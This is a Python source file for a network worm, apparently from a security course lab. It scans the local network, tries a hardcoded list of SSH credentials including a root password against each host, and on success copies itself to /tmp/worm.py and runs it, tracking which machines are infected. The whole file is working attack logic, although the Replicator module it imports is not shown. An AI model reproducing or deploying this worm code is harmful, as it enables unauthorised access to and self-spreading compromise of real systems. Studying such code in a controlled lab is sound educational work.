import sys
import getopt

from Replicator import Replicator

NUM_SYSTEMS_TO_INFECT = 1

try:
	dprint
except:
	def dprint(msg, debug=True):
		if debug:
			print(msg)

def main(argv):

	options, remainder = getopt.getopt(argv, 'ad', ['attack', 'debug'])

	DEBUG = False

	for opt, arg in options:
		if opt in ('-d', '--debug'):
			DEBUG = True

	# The list of credentials to attempt
	credList = [
		('cpsc', 'cpsc'),
		('hello', 'world'),
		('hello1', 'world'),
		('root', '#Gig#'),
	]

	myReplicator = Replicator(credList, DEBUG)

	isHost = True

	# If we are being run without a command line parameters,
	# then we assume we are executing on a victim system and
	# will act maliciously. This way, when you initially run the
	# worm on the origin system, you can simply give it some command
	# line parameters so the worm knows not to act maliciously
	# on attackers system. If you do not like this approach,
	# an alternative approach is to hardcode the origin system's
	# IP address and have the worm check the IP of the current
	# system against the hardcoded IP.
	if len(argv) < 1:

		dprint("Running on victim system...", DEBUG)
		Replicator.markInfected()

		isHost = False

	if isHost:
		Replicator.markAsHost()

	# Get the IP of the current system
	currentIp = Replicator.getMyIP('eth2')
	dprint("Current IP: " + currentIp, DEBUG)

	# Get the hosts on the same network
	networkHosts = Replicator.getHostsOnTheSameNetwork()

	# Remove the IP of the current system
	# from the list of discovered systems (we
	# do not want to target ourselves!).
	if currentIp in networkHosts:
		networkHosts.remove(currentIp)

	dprint("Found hosts: %s" % str(networkHosts), DEBUG)

	systemsInfected = 0

	# Go through the network hosts
	for host in networkHosts:

		dprint("### Probing " + host + " ###", DEBUG)

		# Try to attack this host
		sshInfo, sshClient =  myReplicator.attackSystem(host)

		dprint("Final assessment: " + Replicator.desc(sshInfo), DEBUG)

		# Did the attack succeed?
		if sshInfo == Replicator.SUCCESSFUL_CONNECTION:

			dprint("Trying to spread...", DEBUG)

			# Make sure the remote system is not the host
			if not myReplicator.remoteSystemIsHost():

				# Make sure the remote system is not already infected
				if not myReplicator.remoteSystemIsInfected():

					dprint(host + " is not infected yet", DEBUG)

					# Replicate
					myReplicator.spreadAndExecute(isHost, "/tmp/worm.py")

					systemsInfected += 1
				else:
					dprint(host + " is already infected", DEBUG)
			else:
				dprint("Remote system is host, cancel the attack", DEBUG)


			dprint("Spreading complete", DEBUG)

			if systemsInfected == NUM_SYSTEMS_TO_INFECT:
				break

	dprint("Finished pwning...", DEBUG)
	sys.exit(0)
	
if __name__ == "__main__":
	main(sys.argv[1:])
